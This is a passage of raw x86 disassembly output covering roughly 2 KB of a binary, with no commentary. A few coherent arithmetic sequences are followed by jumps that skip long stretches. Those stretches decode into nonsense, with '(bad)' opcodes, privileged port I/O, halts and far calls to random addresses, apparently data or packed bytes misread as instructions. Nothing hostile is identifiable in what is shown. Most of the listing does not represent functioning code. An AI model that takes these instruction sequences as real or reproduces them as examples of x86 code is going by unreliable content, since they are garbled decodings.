  413898:	mov    WORD PTR [ebx-0xe7e1ba3],cs
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x7d],ebp
  4138e5:	(bad)  
  4138e6:	loope  0x413966
  4138e8:	idiv   DWORD PTR [edx]
  4138ea:	sbb    BYTE PTR [eax],bl
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    BYTE PTR [edi],dl
  4138f1:	mov    ds:0x4788f931,eax
  4138f6:	out    0xbc,eax
  4138f8:	xchg   DWORD PTR [edx+0x16376d25],edi
  4138fe:	ficomp WORD PTR [esi-0x63]
  413901:	pop    es
  413902:	fs shl ebx,0x91
  413906:	xor    DWORD PTR [ecx+edx*4-0x6ed908aa],eax
  41390d:	xchg   ecx,eax
  41390e:	cs sbb al,0x8b
  413911:	inc    esp
  413912:	(bad)  
  413913:	dec    WORD PTR ds:[edx-0x7e165d58]
  41391b:	xchg   edx,eax
  41391c:	jbe    0x41397b
  41391e:	call   0x32547b76
  413923:	add    al,0x9c
  413925:	scas   al,BYTE PTR es:[edi]
  413926:	outs   dx,BYTE PTR ds:[esi]
  413927:	jo     0x413928
  413929:	mov    dh,0xf7
  41392b:	out    dx,eax
  41392c:	sbb    eax,DWORD PTR [esi-0x36277c5a]
  413932:	(bad)
  413935:	sub    al,0xff
  413937:	pop    ds
  413938:	mov    dh,0xeb
  41393a:	push   0xcaeb28a8
  41393f:	(bad)  
  413940:	pop    ds
  413941:	adc    BYTE PTR [edi-0xf],bl
  413944:	test   al,0xc3
  413946:	mov    ds:0xfc5079bf,eax
  41394b:	xchg   ebx,eax
  41394c:	and    esi,DWORD PTR [edi-0x1c6edd2c]
  413952:	sbb    al,0xc5
  413954:	jae    0x4139cf
  413956:	out    dx,al
  413957:	push   ebp
  413958:	(bad)
  41395d:	pop    edx
  41395e:	mov    ah,0xe5
  413960:	mov    ebx,0xf081b880
  413965:	cmp    DWORD PTR [edi],ebx
  413967:	lock test BYTE PTR [eax+ebx*4-0x7b3d89cd],bl
  41396f:	jmp    0x31a99551
  413974:	imul   BYTE PTR [ecx]
  413976:	ss out 0xca,al
  413979:	adc    DWORD PTR [ebx+0x66c17e01],0x42
  413980:	sbb    BYTE PTR [edx+0x14],dh
  413983:	jp     0x4139a6
  413985:	add    BYTE PTR [edi+0x45],al
  413988:	xchg   ebp,eax
  413989:	xor    bh,BYTE PTR [esi-0x70]
  41398c:	push   esp
  41398d:	fldz   
  41398f:	sub    al,BYTE PTR [edi+0x712093df]
  413995:	lahf   
  413996:	ds es inc ecx
  413999:	add    BYTE PTR [edx],0xc3
  41399c:	call   0xa2a4:0x37b69646
  4139a3:	push   ds
  4139a4:	push   esp
  4139a5:	pop    ebp
  4139a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a7:	dec    eax
  4139a8:	jge    0x41394c
  4139aa:	jmp    0x413a0f
  4139ac:	cmp    al,0x34
  4139ae:	std    
  4139af:	ficom  WORD PTR [edx-0x50fc2bb6]
  4139b5:	fiadd  DWORD PTR [esi]
  4139b7:	lods   eax,DWORD PTR ds:[esi]
  4139b8:	gs gs (bad) 
  4139bb:	or     ebp,DWORD PTR [ebx+0x0]
  4139be:	pushf  
  4139bf:	cs call 0x97b2:0x8b64144d
  4139c7:	or     eax,0xf188c064
  4139cc:	leave  
  4139cd:	adc    dl,BYTE PTR [edx+0x69]
  4139d0:	jl     0x413a2d
  4139d2:	inc    ebx
  4139d3:	pop    ds
  4139d4:	mov    ds:0x94905a12,al
  4139d9:	mov    al,ds:0xe61bdabd
  4139de:	jbe    0x413a41
  4139e0:	cwde   
  4139e1:	xchg   edi,eax
  4139e2:	push   cs
  4139e3:	push   0x3f2028d9
  4139e8:	pop    edi
  4139e9:	stos   BYTE PTR es:[edi],al
  4139ea:	lods   eax,DWORD PTR ds:[esi]
  4139eb:	dec    eax
  4139ec:	inc    BYTE PTR [ebp+0x1b]
  4139ef:	paddq  mm3,QWORD PTR [esi+0x52bad349]
  4139f6:	(bad)  
  4139f7:	adc    edi,edi
  4139f9:	nop
  4139fa:	dec    ecx
  4139fb:	shl    DWORD PTR [edi-0x61699733],1
  413a01:	clc    
  413a02:	aam    0x4e
  413a04:	arpl   WORD PTR gs:[ecx+0x7c0491cf],bx
  413a0b:	fidivr DWORD PTR [edi-0xb]
  413a0e:	xor    eax,0xa411516a
  413a13:	(bad)  
  413a14:	hlt    
  413a15:	cmp    DWORD PTR [esi+0x1b],eax
  413a18:	mov    ebp,0x63b80b44
  413a1d:	mov    eax,0xe2898ec8
  413a22:	xchg   ebx,eax
  413a23:	stc    
  413a24:	retf   
  413a25:	push   cs
  413a26:	in     al,0xca
  413a28:	fild   DWORD PTR [ebx]
  413a2a:	cld    
  413a2b:	inc    ebx
  413a2c:	xor    DWORD PTR [edx-0x6d],eax
  413a2f:	cli    
  413a30:	iret   
  413a31:	call   0x6bb98d0b
  413a36:	cli    
  413a37:	pop    ebx
  413a38:	dec    DWORD PTR ds:0x7c78deb3
  413a3e:	test   DWORD PTR [esi],edi
  413a40:	cmp    al,0x38
  413a42:	out    dx,eax
  413a43:	popf   
  413a44:	sbb    eax,0x3a25e4a5
  413a49:	jp     0x413a34
  413a4b:	dec    ebx
  413a4c:	cld    
  413a4d:	and    cl,BYTE PTR [ecx-0x77305568]
  413a53:	dec    esi
  413a54:	adc    eax,0x26b1fbf5
  413a59:	push   ebx
  413a5a:	pop    edx
  413a5b:	gs nop
  413a5d:	jbe    0x413a53
  413a5f:	jecxz  0x413aba
  413a61:	push   ss
  413a62:	xor    DWORD PTR [ebp-0x44ea0658],esp
  413a68:	iret   
  413a69:	sbb    bh,dl
  413a6b:	aaa    
  413a6c:	jmp    0x5baafe59
  413a71:	icebp  
  413a72:	fistp  QWORD PTR [edi-0x5a6416c3]
  413a78:	ss repnz stc 
  413a7b:	arpl   sp,di
  413a7d:	fmul   QWORD PTR [eax+0x70]
  413a80:	mov    dl,0x4d
  413a82:	adc    al,0x4f
  413a84:	ret    0x39fc
  413a87:	jbe    0x413ae2
  413a89:	cmp    WORD PTR [edx+0x7803ecd7],cx
  413a90:	add    al,0x51
  413a92:	out    dx,al
  413a93:	mov    edx,DWORD PTR [edi]
  413a95:	sahf   
  413a96:	push   es
  413a97:	jg     0x413af7
  413a99:	push   ds
  413a9a:	push   cs
  413a9b:	jns    0x413a7c
  413a9d:	sub    ebp,0x12
  413aa0:	out    dx,al
  413aa1:	sbb    DWORD PTR [ebx],0xffffffd9
  413aa4:	cld    
  413aa5:	sti    
  413aa6:	xchg   esi,eax
  413aa7:	dec    esp
  413aa8:	jb     0x413a70
  413aaa:	push   es
  413aab:	jb     0x413a5a
  413aad:	es push esp
  413aaf:	push   eax
  413ab0:	scas   al,BYTE PTR es:[edi]
  413ab1:	test   dh,cl
  413ab3:	sub    dh,BYTE PTR [edx-0x785bb666]
  413ab9:	test   ax,0x6e13
  413abd:	fisubr DWORD PTR [eax]
  413abf:	pop    eax
  413ac0:	mov    DWORD PTR [esi],ecx
  413ac2:	jne    0x413ad0
  413ac4:	mov    dh,0x3d
  413ac6:	xchg   esp,eax
  413ac7:	inc    esi
  413ac8:	mov    edi,0xeef0ee2d
  413acd:	mov    esp,0x32f8c7f2
  413ad2:	dec    ebx
  413ad3:	cmp    cl,BYTE PTR [edx+0x54]
  413ad6:	pushf  
  413ad7:	in     eax,0xc1
  413ad9:	fucomip st,st(5)
  413adb:	ror    DWORD PTR [ebx+0x4f628e2],0xf6
  413ae2:	call   0x31bd:0x74bf6e6a
  413ae9:	jg     0x413ac2
  413aeb:	imul   esi,DWORD PTR [ebx],0xffffff99
  413aee:	fsub   DWORD PTR ds:0xdbd5a9fc
  413af4:	(bad)  
  413af5:	aad    0x22
  413af7:	out    0x86,al
  413af9:	out    dx,eax
  413afa:	mov    dl,0xba
  413afc:	imul   ebp,DWORD PTR [edi],0xa5bc79e9
  413b02:	or     BYTE PTR [edi],al
  413b04:	outs   dx,BYTE PTR ds:[esi]
  413b05:	push   0x4856a070
  413b0a:	xor    al,0x75
  413b0c:	test   eax,ebp
  413b0e:	lock push ebx
  413b10:	mov    ds:0xb76a34d6,al
  413b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b16:	xor    DWORD PTR [ebx+0x438d80aa],esi
  413b1c:	ror    DWORD PTR [edi],0xe2
  413b1f:	and    ah,dh
  413b21:	fs dec esp
  413b23:	xor    BYTE PTR [bx-0x345f],al
  413b28:	(bad)  
  413b29:	arpl   WORD PTR [ecx+0x50],ax
  413b2c:	jbe    0x413b30
  413b2e:	ret    0x1379
  413b31:	sti    
  413b32:	inc    esp
  413b33:	mov    eax,ds:0x82d937b1
  413b38:	sub    DWORD PTR [ebp+0x3c],edi
  413b3b:	jae    0x413af0
  413b3d:	sub    BYTE PTR [ecx+0x6b0492d5],al
  413b43:	and    edx,DWORD PTR [ebp-0x1d]
  413b46:	(bad)  
  413b47:	fldenv [ebp+ecx*8+0x5a]
  413b4b:	cwde   
  413b4c:	fist   WORD PTR [edi]
  413b4e:	ds daa 
  413b50:	jmp    0x38c22adb
  413b55:	(bad)  
  413b56:	pop    esp
  413b57:	dec    ebp
  413b58:	add    ebx,ebx
  413b5a:	lahf   
  413b5b:	aad    0xe2
  413b5d:	push   cs
  413b5e:	xchg   esi,eax
  413b5f:	pop    esi
  413b60:	ror    DWORD PTR [edi+0x38a08402],1
  413b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b67:	ror    DWORD PTR [edx+0x7fd518ad],1
  413b6d:	add    edx,ebx
  413b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b71:	addr16 repz add dh,ch
  413b75:	jo     0x413b4b
  413b77:	mov    esp,edi
  413b79:	pop    esp
  413b7a:	test   al,0x31
  413b7c:	sbb    DWORD PTR [esi-0x6d],eax
  413b7f:	push   esi
  413b80:	sbb    dh,BYTE PTR [esi]
  413b82:	retf   0xc7d9
  413b85:	and    DWORD PTR [ebx+esi*4+0x70b62127],edi
  413b8c:	push   cs
  413b8d:	popa   
  413b8e:	inc    ecx
  413b8f:	pop    ebp
  413b90:	xchg   ecx,eax
  413b91:	cmp    cl,BYTE PTR [ebp-0x41]
  413b94:	jmp    0x57c702ff
  413b99:	ret    0x675e
  413b9c:	(bad)  
  413b9d:	add    BYTE PTR [ebp+0xe],0x8d
  413ba1:	xchg   esp,eax
  413ba2:	mov    bl,0x7d
  413ba4:	les    edi,FWORD PTR ds:0xf2f54f78
  413baa:	test   al,0xb4
  413bac:	sahf   
  413bad:	dec    esp
  413bae:	cmp    DWORD PTR [ebx+0x2],ebp
  413bb1:	xchg   esp,eax
  413bb2:	cmp    dl,BYTE PTR [edi-0x24f8d110]
  413bb8:	loope  0x413c1d
  413bba:	pop    edi
  413bbb:	dec    DWORD PTR [edx+0x20413ddc]
  413bc1:	ins    BYTE PTR es:[edi],dx
  413bc2:	(bad)  
  413bc3:	call   0xc4f599b9
  413bc8:	mov    dl,0xed
  413bca:	imul   edi,ebp,0x1c9b5abe
  413bd0:	rol    esp,cl
  413bd2:	std    
  413bd3:	repnz xlat BYTE PTR ds:[ebx]
  413bd5:	mov    eax,ds:0x46746fc
  413bda:	inc    esp
  413bdb:	lea    edx,[esp+ecx*4+0x7e]
  413bdf:	cmp    edx,DWORD PTR [esi]
  413be1:	inc    ebp
  413be2:	mov    ds:0x2503976c,al
  413be7:	mov    DWORD PTR [edx],edx
  413be9:	je     0x413c2f
  413beb:	push   ebp
  413bec:	xor    al,0xa5
  413bee:	xor    ch,ch
  413bf0:	aaa    
  413bf1:	pop    esp
  413bf2:	sub    BYTE PTR [eax+ecx*4-0x5e4f0c33],0xf
  413bfa:	lea    eax,[ecx-0x2bc7242b]
  413c00:	mov    bl,0xdf
  413c02:	adc    ah,BYTE PTR [edi-0x55]
  413c05:	int3   
  413c06:	outs   dx,BYTE PTR ds:[esi]
  413c07:	mov    bl,0x3c
  413c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c0a:	(bad)  
  413c0b:	mov    ch,0xb9
  413c0d:	push   esp
  413c0e:	mov    esp,0x6c944116
  413c13:	add    ch,BYTE PTR [esi-0x7fc9061]
  413c19:	nop
  413c1a:	loope  0x413c12
  413c1c:	mov    ds:0x9c2f2bf8,al
  413c21:	mov    edx,0xd19c1213
  413c26:	sbb    BYTE PTR [eax+0x48],0x1c
  413c2a:	int    0x2e
  413c2c:	hlt    
  413c2d:	xlat   BYTE PTR ds:[ebx]
  413c2e:	xor    al,0x4e
  413c30:	adc    ebp,DWORD PTR [esi]
  413c32:	adc    BYTE PTR [ecx-0x8],bh
  413c35:	call   0x1bdc:0x5f072328
  413c3c:	mov    ebx,0x18ce096e
  413c41:	jge    0x413c2d
  413c43:	mov    eax,ds:0x9b7bca1d
  413c48:	repz xlat BYTE PTR ds:[ebx]
  413c4a:	in     eax,dx
  413c4b:	out    dx,eax
  413c4c:	mov    ds:0x51b566b,al
  413c51:	adc    dh,BYTE PTR [edi]
  413c53:	push   0xe638d126
  413c58:	jmp    0x25d9:0xec764e8c
  413c5f:	outs   dx,BYTE PTR ds:[esi]
  413c60:	scas   eax,DWORD PTR es:[edi]
  413c61:	push   0x6b383d50
  413c66:	mov    BYTE PTR [ecx],bh
  413c68:	out    dx,eax
  413c69:	mov    dl,0xa0
  413c6b:	(bad)  
  413c6c:	adc    DWORD PTR [edi],ebp
  413c6e:	xchg   BYTE PTR [edi+0x18d04b08],ah
  413c74:	xchg   edi,eax
  413c75:	stc    
  413c76:	and    eax,0xa66297ca
  413c7b:	dec    edx
  413c7c:	sub    eax,0x755f13f6
  413c81:	ins    BYTE PTR es:[edi],dx
  413c82:	push   es
  413c83:	aam    0x5
  413c85:	jne    0x413cdb
  413c87:	in     al,0xc5
  413c89:	pop    eax
  413c8a:	test   dl,cl
  413c8c:	sub    edx,DWORD PTR ds:0xab4b471a
  413c92:	(bad)  
  413c93:	dec    ecx
  413c94:	hlt    
  413c95:	xchg   ebx,eax
  413c96:	dec    ebp
  413c97:	fimul  WORD PTR [ebx-0x4b62224]
  413c9d:	fdivr  DWORD PTR [eax+ecx*2+0x44]
  413ca1:	in     al,dx
  413ca2:	dec    ebx
  413ca3:	popf   
  413ca4:	push   ecx
  413ca5:	ror    BYTE PTR [edi-0x12],1
  413ca8:	push   eax
  413ca9:	sbb    ch,BYTE PTR [ecx+0x4d8b1003]
  413caf:	fcom   DWORD PTR [ebx]
  413cb1:	pop    eax
  413cb2:	add    al,0x6a
  413cb4:	add    dh,BYTE PTR [ebx]
  413cb6:	fimul  WORD PTR [ebx+0x2b5edc75]
  413cbc:	icebp  
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	sub    al,0x30
  413d00:	and    eax,0x183289aa
  413d05:	sbb    BYTE PTR [edx+0x31181812],ch
  413d0b:	jg     0x413d4b
  413d0d:	daa    
  413d0e:	icebp  
  413d0f:	mov    ebx,0xdfcd324d
  413d14:	jmp    0xaffc:0xd31f0e2d
  413d1b:	pop    esi
  413d1c:	sub    eax,0xe5496d1b
  413d21:	mov    ecx,0xaf9765d6
  413d26:	cmp    al,0x86
  413d28:	cmp    ch,BYTE PTR [ebx+ecx*4+0x4806db14]
  413d2f:	xchg   ecx,eax
  413d30:	sbb    bl,BYTE PTR [edi]
  413d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d33:	add    edi,DWORD PTR [ebx+ebx*1+0x7a2dc6e1]
  413d3a:	lock pop ecx
  413d3c:	icebp  
  413d3d:	lock jg 0x413d21
  413d40:	inc    edx
  413d41:	xchg   dx,ax
  413d43:	mov    ds:0x8958d17e,eax
  413d48:	ds stc 
  413d4a:	add    ah,dl
  413d4c:	lods   al,BYTE PTR ds:[esi]
  413d4d:	mov    esp,0x6f7dfd11
  413d52:	les    ecx,FWORD PTR [ebp+0x4bd10e3f]
  413d58:	or     bl,BYTE PTR [ebx]
  413d5a:	cmp    dl,ah
  413d5c:	sbb    bh,cl
  413d5e:	mov    ah,0x8f
  413d60:	popa   
  413d61:	ins    DWORD PTR es:[edi],dx
  413d62:	add    esi,DWORD PTR [ecx-0x6f2d2522]
  413d68:	stc    
  413d69:	(bad)
  413d6d:	dec    eax
  413d6e:	cmp    DWORD PTR [eax-0x61],esp
  413d71:	xor    al,0xce
  413d73:	pop    es
  413d74:	std    
  413d75:	fnstenv [eax+0x5a0aaa36]
  413d7b:	(bad)  
  413d7c:	icebp  
  413d7d:	pop    ebx
  413d7e:	sub    al,0x7
  413d80:	out    0xb1,eax
  413d82:	or     al,0xf2
  413d84:	mov    ecx,esi
  413d86:	ins    DWORD PTR es:[edi],dx
  413d87:	sub    edx,DWORD PTR ds:0xd417c252
  413d8d:	jmp    0x413ded
  413d8f:	pushw  ds
  413d91:	mov    esi,0x6656d41b
  413d96:	aad    0xd8
  413d98:	popf   
  413d99:	mov    BYTE PTR ds:0xf2767681,0x38
  413da0:	xor    al,0xb2
  413da2:	inc    eax
  413da3:	data16 adc BYTE PTR [edx-0x9],0xa1
  413da8:	rcl    esp,0xf1
  413dab:	repnz imul ebx,DWORD PTR [edi],0x50b26580
  413db2:	adc    al,BYTE PTR [edi-0x72cd2a28]
  413db8:	les    eax,FWORD PTR [eax]
  413dba:	std    
  413dbb:	fisttp DWORD PTR [edi+0x40f24b9c]
  413dc1:	inc    esp
  413dc2:	into   
  413dc3:	cmp    edx,DWORD PTR [ebx-0xc]
  413dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dc7:	jle    0x413e36
  413dc9:	xchg   BYTE PTR [edi],dh
  413dcb:	nop
  413dcc:	push   es
  413dcd:	mov    ebp,0xb7e7d747
  413dd2:	jmp    0x413d70
  413dd4:	test   al,0xba
  413dd6:	sbb    edx,DWORD PTR [esi-0x22a78b4f]
  413ddc:	add    edi,esp
  413dde:	xchg   DWORD PTR [eax],ebp
  413de0:	dec    edi
  413de1:	mov    gs,ecx
  413de3:	in     eax,0x1b
  413de5:	mov    ds:0xc8d34ff4,eax
  413dea:	xchg   esp,eax
  413deb:	or     edx,edi
  413ded:	test   BYTE PTR [edx+0x5b],dl
  413df0:	xchg   esi,eax
  413df1:	shl    BYTE PTR [ecx],cl
  413df3:	mov    al,0xe4
  413df5:	enter  0xe676,0x11
  413df9:	jbe    0x413e02
  413dfb:	sahf   
  413dfc:	inc    ebx
  413dfd:	sbb    dl,dl
  413dff:	xchg   edx,eax
  413e00:	mov    dh,0x88
  413e02:	into   
  413e03:	dec    edx
  413e04:	xchg   BYTE PTR [edx],bh
  413e06:	pushf  
  413e07:	cmp    al,0x31
  413e09:	cmp    esi,edi
  413e0b:	fild   DWORD PTR [ebx+0x1f]
  413e0e:	sahf   
  413e0f:	pop    ecx
  413e10:	lods   eax,DWORD PTR ds:[esi]
  413e11:	mov    cl,0x41
  413e13:	test   BYTE PTR [edi+0x4651aa0e],ah
  413e19:	pushf  
  413e1a:	imul   ecx,DWORD PTR [edx+eiz*2],0x54ce37a4
  413e21:	push   esp
  413e22:	inc    ebp
  413e23:	out    0xa5,eax
  413e25:	xchg   edi,ecx
  413e27:	xchg   al,ah
  413e29:	inc    eax
  413e2a:	xchg   esp,esp
  413e2c:	xor    DWORD PTR [edi+esi*1],ebp
  413e2f:	xor    eax,0xdcc35957
  413e34:	fisttp WORD PTR [eax]
  413e36:	pop    eax
  413e37:	and    eax,0xdd7251df
  413e3c:	in     al,dx
  413e3d:	sbb    DWORD PTR gs:[ebx+0x74],esi
  413e41:	sub    esp,DWORD PTR [ebp-0xc2194d6]
  413e47:	js     0x413dd5
  413e49:	inc    ebp
  413e4a:	aam    0x36
  413e4c:	rcl    DWORD PTR [ebp+0x138d64a7],cl
  413e52:	inc    ebx
  413e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e54:	xor    BYTE PTR [eax],dl
  413e56:	jo     0x413de8
  413e58:	bound  edx,QWORD PTR [edx-0x5f9d11e]
  413e5e:	jg     0x413e61
  413e60:	or     al,0x91
  413e62:	pop    es
  413e63:	xor    bl,al
  413e65:	daa    
  413e66:	mov    ecx,0x464cb4c5
  413e6b:	push   edi
  413e6c:	(bad)  
  413e6d:	jmp    0xd25d80aa
  413e72:	push   ebx
  413e73:	iret   
  413e74:	(bad)  
  413e75:	xchg   esi,eax
  413e76:	push   esp
  413e77:	jnp    0x413e2c
  413e79:	mov    cl,0x5f
  413e7b:	add    DWORD PTR [eax-0x21],ebp
  413e7e:	cwde   
  413e7f:	cmp    edx,DWORD PTR [edx+esi*1+0x5]
  413e83:	leave  
  413e84:	xor    DWORD PTR [esi+0x45],ebp
  413e87:	ret    0xf381
  413e8a:	adc    ebx,esp
  413e8c:	out    dx,eax
  413e8d:	fisttp QWORD PTR [esi+0x2a]
  413e90:	shl    DWORD PTR [edi-0x37],0xbb
  413e94:	adc    edx,0xf6a790d
  413e9a:	add    DWORD PTR [edx-0x3cb2279],ebx
  413ea0:	xchg   edi,eax
  413ea1:	inc    esp
  413ea2:	ins    DWORD PTR es:[edi],dx
  413ea3:	ror    BYTE PTR [ebx],1
  413ea5:	je     0x413e2d
  413ea7:	fs jmp 0x413eb0
  413eaa:	pop    es
  413eab:	push   ebp
  413eac:	pop    esp
  413ead:	pop    ebp
  413eae:	xor    dh,al
  413eb0:	and    cl,BYTE PTR [ebp+eax*1-0x1f1ca7b]
  413eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb8:	mov    al,ds:0x252bf8a1
  413ebd:	(bad)  
  413ebe:	fmul   st(1),st
  413ec0:	hlt    
  413ec1:	gs cdq 
  413ec3:	sub    dl,bl
  413ec5:	cmp    BYTE PTR [edx-0xfebfae2],dl
  413ecb:	lock jb 0x413f22
  413ece:	add    al,0xee
  413ed0:	cmp    bl,bh
  413ed2:	inc    eax
  413ed3:	out    dx,eax
  413ed4:	sub    edx,esp
  413ed6:	and    dl,al
  413ed8:	push   ecx
  413ed9:	fsubrp st(5),st
  413edb:	and    al,0xbc
  413edd:	mov    esp,0xf89cc73f
  413ee2:	jecxz  0x413ea5
  413ee4:	inc    ebp
  413ee5:	ins    DWORD PTR es:[edi],dx
  413ee6:	pop    esp
  413ee7:	ret    
  413ee8:	shl    edi,0x1e
  413eeb:	out    0xc8,eax
  413eed:	and    eax,0x460336d6
  413ef2:	fisubr DWORD PTR [eax+0x63345b6d]
  413ef8:	cs scas al,BYTE PTR es:[edi]
  413efa:	and    eax,0x7721dad8
  413eff:	cmp    al,0xfa
  413f01:	pop    ecx
  413f02:	(bad)  
  413f03:	aad    0x85
  413f05:	jl     0x413f47
  413f07:	imul   cx,WORD PTR [eax+esi*2+0x24],0x3f
  413f0d:	mov    dh,0xc6
  413f0f:	sar    BYTE PTR [eax],0xc5
  413f12:	cmc    
  413f13:	jo     0x413ed1
  413f15:	cs cs jmp ebp
  413f19:	dec    edi
  413f1a:	mov    BYTE PTR [edx+0x39],al
  413f1d:	sub    ah,BYTE PTR [edx-0x6a]
  413f20:	sti    
  413f21:	sbb    eax,0xc72fac17
  413f26:	mov    ah,0x17
  413f28:	xchg   edi,eax
  413f29:	or     edi,edx
  413f2b:	inc    esi
  413f2c:	mov    ah,BYTE PTR [ebp-0x3bdd7ede]
  413f32:	mov    WORD PTR [edi],gs
  413f34:	stc    
  413f35:	lea    ebp,[ebx-0x7f053094]
  413f3b:	xor    al,0x7d
  413f3d:	cs (bad) 
  413f3f:	pop    es
  413f40:	xlat   BYTE PTR ds:[ebx]
  413f41:	mov    ?,WORD PTR [ebx]
  413f43:	cmp    bl,BYTE PTR [eax-0x2c]
  413f46:	iret   
  413f47:	pop    es
  413f48:	dec    esi
  413f49:	out    dx,eax
  413f4a:	sub    dh,BYTE PTR [esi+0x1530d737]
  413f50:	(bad)  
  413f52:	call   0xb5e4f77b
  413f57:	out    dx,eax
  413f58:	shr    esi,cl
  413f5a:	adc    al,0xb9
  413f5c:	lds    ecx,FWORD PTR [eax+0x5c]
  413f5f:	mov    esp,0x2e2d7b8e
  413f64:	pop    es
  413f65:	daa    
  413f66:	data16 mov ch,0xbc
  413f69:	sti    
  413f6a:	pop    eax
  413f6b:	inc    ecx
  413f6c:	(bad)  
  413f6d:	loope  0x413f10
  413f6f:	sbb    esp,ebp
  413f71:	aaa    
  413f72:	test   BYTE PTR [ebx-0x25e22228],bl
  413f78:	addr16 nop
  413f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f7b:	fimul  DWORD PTR [esp+esi*4-0x24]
  413f7f:	pop    edi
  413f80:	in     eax,0x9c
  413f82:	in     eax,dx
  413f83:	or     ebp,ebx
  413f85:	adc    al,0x6f
  413f87:	nop
  413f88:	push   0x54
  413f8a:	mov    ah,BYTE PTR [eax-0x127b0e40]
  413f90:	push   es
  413f91:	cmp    DWORD PTR [esi],0xffffffdf
  413f94:	xor    al,0xca
  413f96:	pop    ds
  413f97:	ins    DWORD PTR es:[edi],dx
  413f98:	and    al,0xa3
  413f9a:	cmp    esi,DWORD PTR [ebp-0x14]
  413f9d:	outs   dx,BYTE PTR ds:[esi]
  413f9e:	mov    ebp,ebx
  413fa0:	ins    DWORD PTR es:[edi],dx
  413fa1:	into   
  413fa2:	hlt    
  413fa3:	sbb    BYTE PTR [ebx],al
  413fa5:	pop    ss
  413fa6:	pop    ecx
  413fa7:	fbstp  TBYTE PTR [ecx-0x5ebbfd4e]
  413fad:	dec    edi
  413fae:	xor    eax,0x360cf27c
  413fb3:	and    edi,DWORD PTR [ebx]
  413fb5:	test   BYTE PTR [ecx-0x77bad389],bl
  413fbb:	es aad 0xcc
  413fbe:	pop    ebx
  413fbf:	xchg   BYTE PTR ds:0xa21d781,dh
  413fc5:	jge    0x414042
  413fc7:	stos   BYTE PTR es:[edi],al
  413fc8:	fsubr  st,st(2)
  413fca:	into   
  413fcb:	arpl   dx,dx
  413fcd:	js     0x413fdb
  413fcf:	sbb    DWORD PTR [esi],ebx
  413fd1:	out    dx,al
  413fd2:	shl    DWORD PTR [ebx+0x28],cl
  413fd5:	mov    bl,0x49
  413fd7:	and    eax,0x56ced0f4
  413fdc:	mov    bl,0xd9
  413fde:	sub    al,0xc4
  413fe0:	in     al,0xf9
  413fe2:	mov    esp,0x833eeecb
  413fe7:	sahf   
  413fe8:	into   
  413fe9:	or     al,0x7a
  413feb:	sub    eax,0xb532f715
  413ff0:	lods   eax,DWORD PTR ds:[esi]
  413ff1:	dec    ecx
  413ff2:	fbld   TBYTE PTR [eax-0xb103c81]
  413ff8:	mov    al,0x2f
  413ffa:	xchg   sp,ax
  413ffc:	and    eax,0x1340dbfd
  414001:	add    eax,0x5d13526
  414006:	xchg   edx,eax
  414007:	addr16 sbb eax,0xaef07001
  41400d:	in     eax,0x59
  41400f:	int3   
  414010:	neg    cl
  414012:	in     eax,dx
  414013:	jbe    0x41403d
  414015:	in     al,0xd5
  414017:	lea    ebx,[ebx+0x5e]
  41401a:	sbb    eax,0x128ea591
  41401f:	ret    
  414020:	cmp    eax,0x909198bb
  414025:	sbb    esi,DWORD PTR [esi]
  414027:	inc    esi
  414028:	test   al,0x49
  41402a:	jle    0x41406f
  41402c:	push   ds
  41402d:	mov    BYTE PTR [edi],bl
  41402f:	inc    esi
  414030:	out    dx,al
  414031:	pop    ss
  414032:	lods   eax,DWORD PTR ds:[esi]
  414033:	or     eax,0x16fda7b0
  414038:	fadd   DWORD PTR [esi]
  41403a:	sti    
  41403b:	retf   
  41403c:	mov    cl,0xa
  41403e:	push   ds
  41403f:	das    
  414040:	fs aaa 
  414042:	scas   al,BYTE PTR es:[edi]
  414043:	jo     0x414075
